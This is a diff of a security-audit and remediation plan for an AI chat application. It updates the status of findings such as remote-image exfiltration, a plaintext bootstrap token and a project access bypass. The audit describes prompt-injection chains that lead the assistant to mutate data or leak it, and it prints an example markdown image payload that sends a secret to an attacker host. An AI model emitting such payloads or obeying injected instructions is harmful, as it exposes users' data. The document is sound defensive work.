@@ -49,11 +49,11 @@ The auth/scope _core_ is genuinely well-built (fail-closed op allowlists, grant-
 | D10 | Cancelled/errored streams never log usage → billing undercount                                                                        | HIGH         | **FIXED (W1)** — logs `failure` row                                    |
 | D11 | Mid-stream OpenRouter `error` frames swallowed → truncated answer shipped as complete success                                         | HIGH         | **FIXED (W2)** — error frames throw                                    |
 | S1  | Prompt-injection → immediate data mutation, no human approval (commit-by-default in chat)                                             | **CRITICAL** | CONFIRMED                                                              |
-| S2  | Markdown `<img>` renders remote URLs → zero-click exfiltration                                                                        | HIGH         | CONFIRMED                                                              |
+| S2  | Markdown `<img>` renders remote URLs → zero-click exfiltration                                                                        | HIGH         | **IMPLEMENTED (W3, pending deploy)** — agent-only remote image block   |
 | S3  | On-demand tool materialization has no read/write gate; auto-executes destructive ops same-round                                       | HIGH         | CONFIRMED                                                              |
 | S4  | `timing_metrics` table has no RLS → cross-tenant metadata read/write                                                                  | HIGH         | **FIXED (W1)** — RLS migration (verify live)                           |
-| S5  | Bootstrap link stores plaintext bearer token at rest, never reaped                                                                    | HIGH         | CONFIRMED                                                              |
-| C1  | Ontology-context chats bypass the member-access gate → hydrate public projects you're not a member of                                 | HIGH         | CONFIRMED                                                              |
+| S5  | Bootstrap link stores plaintext bearer token at rest, never reaped                                                                    | HIGH         | **IMPLEMENTED (W3, pending deploy/migration)**                         |
+| C1  | Ontology-context chats bypass the member-access gate → hydrate public projects you're not a member of                                 | HIGH         | **IMPLEMENTED (W3, pending deploy)** — authorize any projectId         |
 | C2  | Client-supplied prewarm context trusted verbatim into system prompt + persisted (session poisoning)                                   | HIGH         | CONFIRMED (×2 passes)                                                  |
 | O2  | `looksLikeExplicitMutationRequest` misfires both ways ("update me on…" nukes correct answers; "assign/postpone/merge" slip through)   | MEDIUM-HIGH  | CONFIRMED                                                              |
 | …   | (full set below, grouped by theme)                                                                                                    |              |                                                                        |
@@ -192,11 +192,16 @@ Launch surfaces preload reads + writes together (`gateway-surface.ts:80-89` dail
 
 **Fix:** route chat writes through `policy.ts`; gate destructive/bulk ops behind explicit confirmation; default to commit-review for any turn that ingested external/third-party content.
 
-### S2. Markdown `<img>` renders remote URLs → zero-click exfiltration — HIGH, CONFIRMED
+### S2. Markdown `<img>` renders remote URLs → zero-click exfiltration — HIGH, IMPLEMENTED (W3, pending deploy)
 
 Assistant messages render via `{@html renderMarkdown(...)}` (`AgentMessageList.svelte:314,351`); `sanitizeOptions` allows `img[src]` with no scheme restriction (`utils/markdown.ts:39,50`). An injected instruction to emit `![](https://attacker/leak?d=SECRET)` auto-fetches attacker.com on render. Chains directly with S1.
 
 **Fix:** deny remote `img` in assistant-rendered markdown (first-party/proxy only) or set CSP `img-src` on the chat surface. (`renderBlogMarkdown` is a separate trusted profile — fine.)
+
+**W3 implementation:** assistant and peer-agent Markdown now uses a dedicated sanitizer that
+allows relative BuildOS/data images but removes `http(s)` and protocol-relative image sources.
+Uploaded user attachments remain on their separate first-party rendering path. Regression tests
+cover remote blocking and relative image preservation.
 
 ### S3. On-demand tool materialization has no read/write gate; auto-executes destructive ops same-round — HIGH, CONFIRMED
 
@@ -210,11 +215,17 @@ Assistant messages render via `{@html renderMarkdown(...)}` (`AgentMessageList.s
 
 **Fix:** `ALTER TABLE timing_metrics ENABLE ROW LEVEL SECURITY;` + service-role ALL + `user_id = auth.uid()` policies. Live check: `select relrowsecurity from pg_class where relname='timing_metrics';`
 
-### S5. Bootstrap link stores plaintext bearer token at rest, never reaped — HIGH, CONFIRMED
+### S5/S8. Bootstrap bearer at rest + reusable setup link — HIGH/MEDIUM, IMPLEMENTED (W3, pending deploy/migration)
 
 `agent-call/bootstrap-link.service.ts:176-184` inserts `payload:{ bearer_token }` in plaintext — the only unhashed copy of a `boca_` caller credential. Expired rows never deleted (410 on read, `:231-235`); retention cron reaps only OAuth artifacts; revoke doesn't clear the row. Also **S8: bootstrap link is multi-use within a 30-min TTL and the token travels in the URL path** fetched unauthenticated (`bootstrap/[setupToken]/+server.ts:10`), landing in CDN/proxy logs and agent transcripts.
 
 **Fix:** single-use atomic consume; delete on fetch + `.lt('expires_at', now())` in the cron; encrypt the payload (reuse `calendar-token-crypto`).
+
+**W3 implementation:** new bearer payloads are encrypted with the existing server token-encryption
+facility; redemption is an atomic delete-and-return; the public endpoint is IP-rate-limited and
+returns `no-store`, `no-referrer`, and `nosniff`; a service-role-only, bounded retention RPC is
+scheduled from worker cleanup. Legacy plaintext rows remain readable only for their original
+30-minute TTL. Migration: `20260829235308_agent_call_bootstrap_hardening.sql`.
 
 ### Other security (medium/low)
 
@@ -226,11 +237,16 @@ Assistant messages render via `{@html renderMarkdown(...)}` (`AgentMessageList.s
 - **S14. Worker Agent Run tool results lack the untrusted-data notice** the web path applies — MEDIUM. `agentRunWorker.ts:1048-1051` injects `JSON.stringify(result.data).slice(0,4000)` with no wrapper; same raw Google-event pass-through in `agent-run-calendar-port.ts:500-502`. **Fix:** apply the same untrusted wrapper on the worker transcript.
 - **S15. Observability INSERT policies don't verify session/turn ownership** (`20260428000015:145-200`) — LOW; forge-telemetry-with-known-session-UUID, no read gained. **S16. `web_page_visits` is a cross-user shared cache** keyed only by `normalized_url` on the admin client (`external-executor.ts:302-345`) — user A's visit to a signed/private URL serves its content to user B. **S17. Local prompt dumps have a prod escape hatch** (`FASTCHAT_LOCAL_PROMPT_DUMPS=true`, `prompt-dump-files.ts:57-88`). Plus L-tier: calendar `onto_event_id` pass-through, worker write-op schema gaps, `allowed_ops=null` fail-open to mode default, silent OpenClaw scope widening at auth, internal-error disclosure to external callers.
 
-### C1. Ontology-context chats bypass the member-access gate — HIGH, CONFIRMED
+### C1. Ontology-context chats bypass the member-access gate — HIGH, IMPLEMENTED (W3, pending deploy)
 
 `isProjectScopedContext` returns true only for `project` (`scope.ts:52-56`), but `resolveRpcContextType` maps `ontology`+projectId to the `project` RPC path (`:72-82`). The stream/prewarm member-access gate runs only for project-scoped contexts (`stream/+server.ts:2049`, `prewarm/+server.ts:287`) — **not for `ontology`**. Migration `20260514002000` deliberately made the RPC require _member_ access, returning NULL for a non-member on a public project — but on NULL, `loadFastChatPromptContext` silently falls through to the manual-query branch (`context-loader.ts:2988-3001` → `loadProjectContextData`), which runs plain RLS-scoped selects, and RLS explicitly allows public reads (`project_select_public` etc.). So an authenticated non-member opens an `ontology` chat on a public project's id and hydrates its full seed bundle (description, tasks, goals, docs, START HERE). A non-UUID `focusEntityId` is a deliberate lever to force the fallback (no UUID validation at the boundary).
 
 **Fix:** run `checkProjectAccess` for any resolved projectId regardless of contextType; treat RPC-null on the project path as terminal instead of falling back to RLS queries; UUID-validate `focusEntityId`/`projectId` at the request boundary.
+
+**W3 implementation:** legacy stream and prewarm authorize every resolved `projectId`, not only
+contexts normalized to `project`; their project/focus wire identifiers are UUID-validated; and an
+empty, failed, or unusable project-context RPC returns no project data instead of entering the
+RLS-visible manual fallback. Worker admission already enforced the equivalent access boundary.
 
 ### C2. Client-supplied prewarm context trusted verbatim → session poisoning — HIGH, CONFIRMED (two passes)
 
@@ -381,7 +397,7 @@ Implemented in three parallel tracks, all validated (51 targeted tests pass, `sv
 
 ---
 
-### Wave 3 — Security hardening (THE NEXT PASS — not started)
+### Wave 3 — Security hardening (IN PROGRESS — immediate boundary slice implemented)
 
 **Why this is next:** with the data-integrity/durability cluster done, the highest-severity remaining findings are all security — including the only two remaining **CRITICALs** (S1) and the zero-click exfiltration (S2). The theme: _the action side of interactive chat lacks the policy layer that Agent Runs already have._ Run as three tracks. Track G (the injection chain) is the flagship and should be designed as one piece; Tracks H and I can parallelize once G's approach is set.
 
@@ -389,19 +405,19 @@ Implemented in three parallel tracks, all validated (51 targeted tests pass, `sv
 
 - **S1 (CRITICAL)** — route chat writes through `packages/shared-agent-ops/src/policy.ts` scope enforcement (the gateway/Agent-Run path already uses it; the interactive chat path does not). Gate destructive/bulk ops (delete, graph reorg) behind explicit confirmation. Default any turn that **ingested external/third-party content** (calendar descriptions, shared docs, MCP/web*visit results) to commit-**review** instead of commit-by-default. \_Design note:* decide the policy-injection point (tool-execution-service vs the executor construction) and how "this turn ingested external content" is tracked across rounds.
 - **S3 (HIGH)** — add a read/write (and destructive) gate to on-demand tool **materialization** (`gateway-surface.ts materializeGatewayTools` + the on-miss auto-execute path in `stream-orchestrator/index.ts`). A nominally read-only turn must not be able to load-and-run `delete_calendar_event` mid-round without confirmation. The lean surface is a latency optimization, not a security boundary — make write materialization explicit.
-- **S2 (HIGH, cheap — do first, ships value immediately)** — block/proxy remote `<img>` in assistant-rendered markdown (`AgentMessageList.svelte` → `utils/markdown.ts sanitizeOptions`: drop remote `img` or restrict `src` to same-origin/`data:`), or add a chat-surface CSP `img-src`. Closes the exfiltration half of the chain on its own.
+- **S2 (HIGH) — IMPLEMENTED (W3, pending deploy):** assistant-only Markdown blocks automatic remote image loads while relative BuildOS/data images and separate uploaded attachments remain available.
 - _Sequence:_ S2 first (self-contained, immediate), then S1+S3 together (shared design: the policy layer + a per-turn "external content ingested" flag that both the write gate and the materialization gate consult).
 
 **Track H — Access & trust boundaries (parallel with G once its design is set).**
 
-- **C1 (HIGH)** — run `checkProjectAccess` for any resolved projectId regardless of `contextType` (the `ontology` context currently skips the member gate); treat RPC-null on the project path as terminal instead of falling back to RLS-public reads; UUID-validate `focusEntityId`/`projectId` at the request boundary.
+- **C1 (HIGH) — IMPLEMENTED (W3, pending deploy):** every resolved project is membership-checked in retained legacy/prewarm paths; project/focus identifiers are UUID-validated; project RPC failure is terminal.
 - **C2 (HIGH)** — stop trusting client-supplied `prewarmedContext.context` verbatim: re-derive server-side (the `else` branch already does), or HMAC/nonce it like prepared-prompts; never persist a client-origin cache into `agent_metadata`; ignore client `created_at` for freshness.
 - **S7 (MEDIUM)** — archived/out-of-scope project fence bypass on `onto.project.update`: require `scope.project_ids` membership in the archived fallback; re-apply `deleted_at IS NULL` under `includeArchived`.
 
 **Track I — Abuse limits & secrets/PII hygiene (parallel; mostly independent).**
 
-- **S6 (MEDIUM)** — re-enable rate limiting: per-user concurrent-stream cap on the v2 stream + token-bucket; reuse `checkOAuthRateLimit` on the gateway/bootstrap routes (unauthenticated flood + `security_events` write amplification).
-- **S5 / S8 (HIGH/MEDIUM)** — bootstrap token: encrypt at rest (reuse `calendar-token-crypto`), single-use atomic consume, reap expired rows in the retention cron.
+- **S6 (MEDIUM, PARTIAL):** bootstrap redemption now has the shared per-IP limiter; per-user stream limiting and other unauthenticated gateway surfaces remain open.
+- **S5 / S8 (HIGH/MEDIUM) — IMPLEMENTED (W3, pending deploy/migration):** encrypted bearer payload, atomic single-use redemption, hardened response headers, and scheduled bounded cleanup.
 - **Hygiene sweep** — S9/S14 (stop logging full tool args / search text; use `previewToolArguments`), S13 (strip Postgres `details`/`hint` from model-facing errors), S10/S11/S12 (retention jobs for `chat_prompt_snapshots` / tool-exec rows / prepared prompts; drop `rendered_dump_text`), S15–S17 (observability INSERT ownership check; scope `web_page_visits` cache per user; remove the prod prompt-dump escape hatch).
 
 **Suggested Wave 3 sequencing:** close the Wave 2 tail (above) → **S2** (immediate) → design + build **S1+S3** (flagship, one PR or a tight set) → Tracks H and I in parallel. Keep S1's policy-layer change and each migration in their own reviewable PRs. Consider pulling **Wave 5 observability** forward to run alongside, so the injection-defense and rate-limit changes are measurable.
